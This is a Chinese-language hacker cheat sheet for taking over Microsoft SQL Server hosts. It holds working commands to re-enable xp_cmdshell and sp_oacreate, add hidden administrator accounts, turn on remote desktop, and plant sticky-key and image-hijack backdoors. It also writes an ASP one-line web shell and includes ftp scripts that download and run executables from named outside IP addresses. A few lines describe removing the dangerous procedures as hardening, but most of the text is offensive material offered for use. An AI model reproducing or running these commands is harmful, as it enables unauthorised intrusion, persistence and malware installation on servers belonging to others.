net user SQLDebugger list /add
net localgroup administrators SQLDebugger /add

Error Message:未能找到存储过程 'master..xp_cmdshell'。
修复法：很通用的，其实碰到 其他126 127的都可以一起修复，
除了xplog70.dll其他的都可以用这命令修复
xp_cmdshell新的恢复办法 
第一步先删除：
drop procedure sp_addextendedproc 
drop procedure sp_oacreate 
exec sp_dropextendedproc 'xp_cmdshell' 
服务器: 消息 3701，级别 11，状态 5，行 1
无法 除去 过程 'sp_addextendedproc'，因为它在系统目录中不存在。
服务器: 消息 3701，级别 11，状态 5，过程 sp_dropextendedproc，行 18
无法 除去 过程 'xp_cmdshell'，因为它在系统目录中不存在。
第二步恢复：
dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
dbcc addextendedproc ("xp_cmdshell","xplog70.dll") 
直接恢复，不管sp_addextendedproc是不是存在 



xplog70.dll修复：
Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
修复XPLOG70.DLL（先用文件查看下备份的目录下\x86\bin,然后把下面目录替换）
第一步
exec sp_dropextendedproc 'xp_cmdshell'
第二步
dbcc addextendedproc ("xp_cmdshell","c:\sql2ksp4\x86\binn\xplog70.dll")


未能找到存储过程 'master..xp_cmdshell'。
第一步:
create procedure sp_addextendedproc --- 1996/08/30 20:13
@functname nvarchar(517),/* (owner.)name of function to call
*/
@dllname varchar(255)/* name of DLL containing function */
as
set implicit_transactions off
if @@trancount > 0
begin
raiserror(15002,-1,-1,'sp_addextendedproc')
return (1)
end
dbcc addextendedproc( @functname, @dllname)
return (0) -- sp_addextendedproc
GO
第二步:
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int


SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。 
;EXEC sp_configure 'show advanced options', 1 -- 
;RECONFIGURE WITH OVERRIDE -- 
;EXEC sp_configure 'xp_cmdshell', 1 -- 
;RECONFIGURE WITH OVERRIDE -- 
;EXEC sp_configure   'show advanced options', 0 -- 

;EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--

删除sql危险存储： 
DROP PROCEDURE sp_makewebtask 
exec master..sp_dropextendedproc xp_cmdshell 
exec master..sp_dropextendedproc xp_dirtree 
exec master..sp_dropextendedproc xp_fileexist 
exec master..sp_dropextendedproc xp_terminate_process 
exec master..sp_dropextendedproc sp_oamethod 
exec master..sp_dropextendedproc sp_oacreate 
exec master..sp_dropextendedproc xp_regaddmultistring 
exec master..sp_dropextendedproc xp_regdeletekey 
exec master..sp_dropextendedproc xp_regdeletevalue 
exec master..sp_dropextendedproc xp_regenumkeys 
exec master..sp_dropextendedproc xp_regenumvalues 
exec master..sp_dropextendedproc sp_add_job 
exec master..sp_dropextendedproc sp_addtask 
exec master..sp_dropextendedproc xp_regread 
exec master..sp_dropextendedproc xp_regwrite 
exec master..sp_dropextendedproc xp_readwebtask 
exec master..sp_dropextendedproc xp_makewebtask 
exec master..sp_dropextendedproc xp_regremovemultistring 
exec master..sp_dropextendedproc sp_OACreate 
DROP PROCEDURE sp_addextendedproc 


恢复扩展存储过程的办法 
先恢复sp_addextendedproc，语句如下： 
第一：
create procedure sp_addextendedproc --- 1996/08/30 20:13 
@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as 
set implicit_transactions off 
if @@trancount > 0   
begin 
raiserror(15002,-1,-1,'sp_addextendedproc')   
return (1)   
end 
dbcc addextendedproc( @functname, @dllname)   
return (0) -- sp_addextendedproc 
GO 
第二： 
use master   
exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'   
exec sp_addextendedproc xp_dirtree,'xpstar.dll'   
exec sp_addextendedproc xp_enumgroups,'xplog70.dll'   
exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'   
exec sp_addextendedproc xp_loginconfig,'xplog70.dll'   
exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'   
exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'   
exec sp_addextendedproc sp_OACreate,'odsole70.dll'   
exec sp_addextendedproc sp_OADestroy,'odsole70.dll'   
exec sp_addextendedproc sp_OAGetErrorInfo,'odsole70.dll'   
exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'   
exec sp_addextendedproc sp_OAMethod,'odsole70.dll'   
exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'   
exec sp_addextendedproc sp_OAStop,'odsole70.dll'   
exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'   
exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'   
exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'   
exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'   
exec sp_addextendedproc xp_regread,'xpstar.dll'   
exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'   
exec sp_addextendedproc xp_regwrite,'xpstar.dll'   
exec sp_addextendedproc xp_availablemedia,'xpstar.dll'



删除扩展存储过过程xp_cmdshell的语句: 
exec sp_dropextendedproc 'xp_cmdshell' 

恢复cmdshell的sql语句 
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll' 


开启cmdshell的sql语句 
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll' 


判断存储扩展是否存在 
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 
返回结果为1就ok 


恢复xp_cmdshell 
exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 
返回结果为1就ok 
否则上传xplog7.0.dll 
exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll' 


堵上cmdshell的sql语句 
sp_dropextendedproc "xp_cmdshell 


一.更改sa口令方法：
用sql综合利用工具连接后，执行命令：
exec sp_password NULL,'新密码','sa'
(提示：慎用!)



二.简单修补sa弱口令.
方法1:查询分离器连接后执行：
if exists (select * from 
dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and 
OBJECTPROPERTY(id, N'IsExtendedProc') = 1)
exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'
GO
然后按F5键命令执行完毕


方法2:查询分离器连接后
第一步执行：use master 
第二步执行：sp_dropextendedproc 'xp_cmdshell' 
然后按F5键命令执行完毕


无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
恢复方法：查询分离器连接后,
第一步执行：sp_dropextendedproc "xp_cmdshell"
第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'



无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
恢复方法：查询分离器连接后,
第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll'            
然后按F5键命令执行完毕



如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
查询分离器连接后,
2000servser系统:
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user Web hacker /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators Web /add'
xp或2003server系统: 126错误！命令
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user Web$ hacker /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators Web$ /add'



C:\>DIR C:\
SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
分析器执行的语句：
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;



有时候用查询分离器连接执行以上语句的时候会出现找不到存储过程 sp_addextendedproc
解决方法:
create procedure sp_addextendedproc --- 1996/08/30 20:13
@functname nvarchar(517),/* (owner.)name of function to call */
@dllname varchar(255)/* name of DLL containing function */
as
set implicit_transactions off
if @@trancount > 0
begin
raiserror(15002,-1,-1,'sp_addextendedproc')
return (1)
end
dbcc addextendedproc( @functname, @dllname)
return (0) -- sp_addextendedproc
GO
这段代码贴入查询分离器,执行


资源管理器：
c:\windows\explorer.exe

查看目录
exec master.dbo.xp_subdirs 'c:\' 
列出磁盘
exec master..xp_fixeddrives 

xpsql.cpp: 错误 5 来自 CreateProcess（第 737 行） 直接加帐号！
EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SoftWare\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user 123 123 /add")');
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators 123 /add")');



echo Windows Registry Editor Version 5.00 >3389.reg 
echo. >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] >>3389.reg 
echo "Enabled"="0" >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >>3389.reg 
echo "ShutdownWithoutLogon"="0" >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] >>3389.reg 
echo "EnableAdminTSRemote"=dword:00000001 >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg 
echo "TSEnabled"=dword:00000001 >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] >>3389.reg 
echo "Start"=dword:00000002 >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] >>3389.reg 
echo "Start"=dword:00000002 >>3389.reg 
echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] >>3389.reg 
echo "Hotkey"="1" >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg 
echo "PortNumber"=dword:00000D3D >>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg 
echo "PortNumber"=dword:00000D3D >>3389.reg 
regedit /s 3389.reg
开3389：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;--  

关3389：
exec master.dbo.xp_regwrite'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',1;  
查看3389端口
exec xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'

查看系统版本
type c:\boot.ini 

普通CMD后门
xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\cmd.exe'



建立用户1-这里默认用户是Reconditeness密码9527可自行修改
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c net1 user Reconditeness 9527 /ad &net localgroup administrators terks /ad")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c net1 user Reconditeness 9527 /ad &net localgroup administrators terks /ad")')



win2K直接上PS马
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\winnt\system32\ias\ias.mdb','select shell("cmd.exe /c @echo open 60.190.176.85>>net.txt&@echo reconditeness>>net.txt&@echo 7259>>net.txt&@echo get 0.exe>>net.txt&@echo bye>>net.txt&@ftp -s:net.txt&del net.txt & 0.exe")')


win03-XP直接上PS马
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell("cmd.exe /c @echo open 60.190.176.85>>net.txt&@echo reconditeness>>net.txt&@echo 7259>>net.txt&@echo get 0.exe>>net.txt&@echo bye>>net.txt&@ftp -s:net.txt&del net.txt & 0.exe")')



5下shift后门命令
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out 
exec sp_oamethod @o, 'copyfile',null,'c:\windows\explorer.exe' ,'c:\windows\system32\sethc.exe';
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out 
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\sethc.exe' ,'c:\windows\system32\dllcache\sethc.exe';
copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe


declare @o int
exec sp_oacreate 'wscript.shell', @o out
exec sp_oamethod @o, 'run', NULL, 'XXXXX' 为你要执行的命令



写入注册表指定的键里指定的值)，使用方法(在键HKEY_LOCAL_MACHINE\SOFTWARE\aaa\aaaValue写入bbb)： 
EXEC master..xp_regwrite 
@rootkey='HKEY_LOCAL_MACHINE', 
@key='SOFTWARE\aaa', 
@value_name='aaaValue', 
@type='REG_SZ', 
@value='bbb' 


@echo open 121.22.56.5>c:\bin.txt&@echo list>>c:\bin.txt&@echo list>>c:\bin.txt&@echo get gzn.exe>>c:\bin.txt&@echo bye>>c:\bin.txt&@ftp -s:c:\bin.txt&del c:\bin.txt&gzn.exe&gzn.exe&gzn.exe

先copy 到wmpub目录里
@echo cd c:\wmpub\>c:\wmpub\in.bat&@echo ftp -s:c:\wmpub\xiuxiu.txt>>c:\wmpub\in.bat

开3389
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f


C:\WINDOWS\system32\dllcache\net1.exe localgroup administrators IUSR_SERVER /add


SQL写一句话
exec master.dbo.xp_subdirs 'd:\web\cdlxkj'; 
exec sp_makewebtask 'd:\web\cdlxkj\XX.asp','select''<%execute(request("SB"))%>'' '

SA沙盒模式提权-----
----------------------
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
-------------------------------------------------------
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net user sql$ 123 /add")');
-------------------------------------------------------
Select * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\windows\system32\ias\ias.mdb','select shell("net localgroup administrators sql$ /add")');


3389   SHIFT
用上的语句:
入侵
EXEC master..xp_regwrite
@rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger',
@type='REG_SZ',
@value='C:\WINDOWS\explorer.exe' 

恢复
EXEC master..xp_regwrite
@rootkey='HKEY_LOCAL_MACHINE',
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',
@value_name='Debugger',
@type='REG_SZ',
@value=''

映象劫持
EXEC master..xp_regwrite ---这是注册表编辑!
@rootkey='HKEY_LOCAL_MACHINE', ---这是位置!
@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',  -----这也是位置!
@value_name='Debugger',  ---这是表名!
@type='REG_SZ',        ---这里是写入的意思!
@value='C:\WINDOWS\explorer.exe'   ----这里是写入内容!
整个过程是利用master..xp_regwrite这组件来完成的,


1.sql命令查询注册表粘滞键是否被劫持
exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'
2.sql命令劫持注册表粘滞键功能,替换成任务管理器(当然你也可以替换成你想要的其他命令)
xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe', 
'Debugger','REG_SZ','C:\WINDOWS\system32\taskmgr.exe'
3.sql命令删除注册表粘滞键的劫持功能保护你的服务器不再被他人利用
xp_regdeletekey 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe'


sql写文件
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject("WSCRIPT.NETWORK")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.ComputerName'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&"/Administrators,group")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create("user","test")'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "1234"'
exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '
exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&"/test",user) '
exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/test"'


无NET提权的脚本
struser=wscript.arguments(0)
strpass=wscript.arguments(1)
set lp=createObject("WSCRIPT.NETWORK") 
oz="WinNT://"&lp.ComputerName 
Set ob=GetObject(oz) 
Set oe=GetObject(oz&"/Administrators,group") 
Set od=ob.create("user",struser) 
od.SetPassword strpass 
od.SetInfo 
Set of=GetObject(oz&"/" & struser & ",user") 
oe.Add(of.ADsPath) 
For Each admin in oe.Members
if struser=admin.Name then
Wscript.echo struser & " 建立成功!"
wscript.quit
end if
Next
Wscript.echo struser & " 用户建立失败!"
将以上保存为user.VBS文件
然后执行：cscript user.vbs 用户名 密码
删除xp_cmdshell命令：（分离器中执行）
exec sp_dropextendedproc 'xp_cmdshell'
注册表修改3389终端连接命令：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp （PortNumber） 端口
方法1:查询分离器连接后
第一步执行：use master 
第二步执行：sp_dropextendedproc 'xp_cmdshell' 
然后按F5键命令执行完毕

三.常见情况恢复执行xp_cmdshell.
1 未能找到存储过程'master..xpcmdshell'.
恢复方法：查询分离器连接后,
第一步执行:EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 
第二步执行:sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 
然后按F5键命令执行完毕
2 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。）
恢复方法：查询分离器连接后,
第一步执行：sp_dropextendedproc "xp_cmdshell"
第二步执行：sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll'
然后按F5键命令执行完毕
3 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。)
恢复方法：查询分离器连接后,
第一步执行:exec sp_dropextendedproc 'xp_cmdshell'
第二步执行:exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' 
然后按F5键命令执行完毕
四.终极方法.
如果以上方法均不可恢复,请尝试用下面的办法直接添加帐户:
查询分离器连接后,
2000servser系统:
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net user dell huxifeng007 /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\winnt\system32\cmd.exe /c net localgroup administrators dell /add'
xp或2003server系统:
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user dell huxifeng007 /add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators dell /add'

方法二
xp_cmdshell新的恢复办法
删除
drop procedure sp_addextendedproc
drop procedure sp_oacreate
exec sp_dropextendedproc 'xp_cmdshell'
恢复
dbcc addextendedproc ("sp_oacreate","odsole70.dll")
dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
这样可以直接恢复，不用去管sp_addextendedproc是不是存在
-----------------------------
删除扩展存储过过程xp_cmdshell的语句:
exec sp_dropextendedproc 'xp_cmdshell'
恢复cmdshell的sql语句
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'

开启cmdshell的sql语句
exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
判断存储扩展是否存在
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
返回结果为1就ok
恢复xp_cmdshell
exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
返回结果为1就ok
否则上传xplog7.0.dll
exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll'
堵上cmdshell的sql语句
sp_dropextendedproc "xp_cmdshell 


WINDOWS系统使用：
echo open 218.26.89.17 >C:\WINDOWS\1.txt
echo 1 >>C:\WINDOWS\1.txt
echo 1 >>C:\WINDOWS\1.txt
echo get BUG.exe>>C:\WINDOWS\1.txt
echo bye>>C:\WINDOWS\1.txt
ftp -s:C:\WINDOWS\1.txt
BUG.exe
del C:\WINDOWS\1.txt
NT系统使用：
echo open 218.26.89.17 >C:\WINNT\1.txt
echo 1 >>C:\WINNT\1.txt
echo 1 >>C:\WINNT\1.txt
echo get BUG.exe>>C:\WINNT\1.txt
echo bye>>C:\WINNT\1.txt
ftp -s:C:\WINNT\1.txt
BUG.exe
del C:\WINNT\1.txt


系统后门：
copy c:\windows\explorer.exe c:\windows\system32\sethc.exe
copy c:\windows\system32\sethc.exe c:\windows\system32\dllcache\sethc.exe
attrib c:\windows\system32\sethc.exe +h
attrib c:\windows\system32\dllcache\sethc.exe +h
恢复存储过程'master..xpcmdshell'：
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int 


卸载存储过程xp_cmdshell：
sp_dropextendedproc 'xp_cmdshell'






第七、Error Message:xpsql.cpp: 错误 5 来自 CreateProcess（第 675 行）

dbcc dropextendedproc ("xp_cmdshell");
dbcc addextendedproc ("xp_cmdshell","xplog70.dll");
dbcc dropextendedproc ("xp_dirtree");
dbcc addextendedproc ("xp_dirtree","xpstar.dll");
dbcc dropextendedproc ("xp_regread");
dbcc addextendedproc ("xp_regread","xpstar.dll");
dbcc dropextendedproc ("xp_regwrite");
dbcc addextendedproc ("xp_regwrite","xpstar.dll");
dbcc dropextendedproc ("sp_OACreate");
dbcc addextendedproc ("sp_OACreate","odsole70.dll");
dbcc dropextendedproc ("sp_OAMethod");
dbcc addextendedproc ("sp_OAMethod","odsole70.dll");
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'wbem\sr cmd.exe /e /g system:f'
declare @shell1 int exec sp_oacreate 'wscript.shell',@shell1 output exec sp_oamethod @shell1,'run',null,'wbem\sr net1.exe /e /g system:f'
declare @shell2 int exec sp_oacreate 'wscript.shell',@shell2 output exec sp_oamethod @shell2,'run',null,'wbem\sr net.exe /e /g system:f'
declare @shell3 int exec sp_oacreate 'wscript.shell',@shell3 output exec sp_oamethod @shell3,'run',null,'wbem\sp cmd.exe /e /g system:f'
declare @shell4 int exec sp_oacreate 'wscript.shell',@shell4 output exec sp_oamethod @shell4,'run',null,'wbem\sp net1.exe /e /g system:f'
declare @shell5 int exec sp_oacreate 'wscript.shell',@shell5 output exec sp_oamethod @shell5,'run',null,'wbem\sp net.exe /e /g system:f'
declare @shell6 int exec sp_oacreate 'wscript.shell',@shell6 output exec sp_oamethod @shell6,'run',null,'ws cmd.exe /e /g system:f'
declare @shell7 int exec sp_oacreate 'wscript.shell',@shell7 output exec sp_oamethod @shell7,'run',null,'ws net1.exe /e /g system:f'
declare @shell8 int exec sp_oacreate 'wscript.shell',@shell8 output exec sp_oamethod @shell8,'run',null,'ws net.exe /e /g system:f'
declare @shell9 int exec sp_oacreate 'wscript.shell',@shell9 output exec sp_oamethod @shell9,'run',null,'wbem\we cmd.exe /e /g system:f'
declare @shell10 int exec sp_oacreate 'wscript.shell',@shell10 output exec sp_oamethod @shell10,'run',null,'wbem\we net1.exe /e /g system:f'
declare @shell11 int exec sp_oacreate 'wscript.shell',@shell11 output exec sp_oamethod @shell11,'run',null,'wbem\we net.exe /e /g system:f'
declare @shell12 int exec sp_oacreate 'wscript.shell',@shell12 output exec sp_oamethod @shell12,'run',null,'wbem\xj cmd.exe /e /g system:f'
declare @shell13 int exec sp_oacreate 'wscript.shell',@shell13 output exec sp_oamethod @shell13,'run',null,'wbem\xj net1.exe /e /g system:f'
declare @shell14 int exec sp_oacreate 'wscript.shell',@shell14 output exec sp_oamethod @shell14,'run',null,'wbem\xj net.exe /e /g system:f'
declare @shell15 int exec sp_oacreate 'wscript.shell',@shell15 output exec sp_oamethod @shell15,'run',null,'drivers\vs cmd.exe /e /g system:f'
declare @shell16 int exec sp_oacreate 'wscript.shell',@shell16 output exec sp_oamethod @shell16,'run',null,'drivers\vs net1.exe /e /g system:f'
declare @shell17 int exec sp_oacreate 'wscript.shell',@shell17 output exec sp_oamethod @shell17,'run',null,'drivers\vs net.exe /e /g system:f'
declare @shell18 int exec sp_oacreate 'wscript.shell',@shell18 output exec sp_oamethod @shell18,'run',null,'cs cmd.exe /e /g system:f'
declare @shell19 int exec sp_oacreate 'wscript.shell',@shell19 output exec sp_oamethod @shell19,'run',null,'cs net1.exe /e /g system:f'
declare @shell20 int exec sp_oacreate 'wscript.shell',@shell20 output exec sp_oamethod @shell20,'run',null,'cs net.exe /e /g system:f'
declare @shell21 int exec sp_oacreate 'wscript.shell',@shell21 output exec sp_oamethod @shell21,'run',null,'drivers\vsx cmd.exe /e /g system:f'
declare @shell22 int exec sp_oacreate 'wscript.shell',@shell22 output exec sp_oamethod @shell22,'run',null,'drivers\vsx net1.exe /e /g system:f'
declare @shell23 int exec sp_oacreate 'wscript.shell',@shell23 output exec sp_oamethod @shell23,'run',null,'drivers\vsx net.exe /e /g system:f'


 第八、在查询分析器中经常遇到下面这个错误：Error Message:无法装载 DLL 江湖上到处散布着吃哥屎长大的人 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。

 

下面是解决方法：
1.
dbcc dropextendedproc ("xp_cmdshell")
2.（执行2次）
drop procedure sp_addextendedproc 
drop procedure sp_oacreate 
exec sp_dropextendedproc 'xp_cmdshell' 
3.
dbcc addextendedproc ("sp_oacreate","odsole70.dll") 
dbcc addextendedproc ("xp_cmdshell","xplog70.dll")


第二版：

****************************************************

net user SQLDebugger list /add
net localgroup administrators SQLDebugger /add
Error Message:未能找到存储过程 'master..xp_cmdshell'。
修复法：很通用的，其实碰到 其他126 127的都可以一起修复，
除了xplog70.dll其他的都可以用这命令修复
xp_cmdshell新的恢复办法
第一步先删除：
drop procedure sp_addextendedproc
drop procedure sp_oacreate
exec sp_dropextendedproc 'xp_cmdshell'
服务器: 消息 3701，级别 11，状态 5，行 1
无法 除去 过程 'sp_addextendedproc'，因为它在系统目录中不存在。
服务器: 消息 3701，级别 11，状态 5，过程 sp_dropextendedproc，行 18
无法 除去 过程 'xp_cmdshell'，因为它在系统目录中不存在。
第二步恢复：
dbcc addextendedproc ("sp_oacreate","odsole70.dll")
dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
直接恢复，不管sp_addextendedproc是不是存在
xplog70.dll修复：
Error Message:无法装载 DLL xplog70.dll 或该 DLL 所引用的某一 DLL。原因: 126(找不到指定的模块。)。
修复XPLOG70.DLL（先用文件查看下备份的目录下\x86\bin,然后把下面目录替换）
第一步
exec sp_dropextendedproc 'xp_cmdshell'
第二步
dbcc addextendedproc ("xp_cmdshell","c:\sql2ksp4\x86\binn\xplog70.dll")
未能找到存储过程 'master..xp_cmdshell'。
第一步:
create procedure sp_addextendedproc --- 1996/08/30 20:13
@functname nvarchar(517),
@dllname varchar(255)
as
set implicit_transactions off
if @@trancount > 0
begin
raiserror(15002,-1,-1,'sp_addextendedproc')
return (1)
end
dbcc addextendedproc( @functname, @dllname)
return (0) -- sp_addextendedproc
GO
第二步:
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int
SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 "外围应用配置器"。
;EXEC sp_configure 'show advanced options', 1 --
;RECONFIGURE WITH OVERRIDE --
;EXEC sp_configure 'xp_cmdshell', 1 --
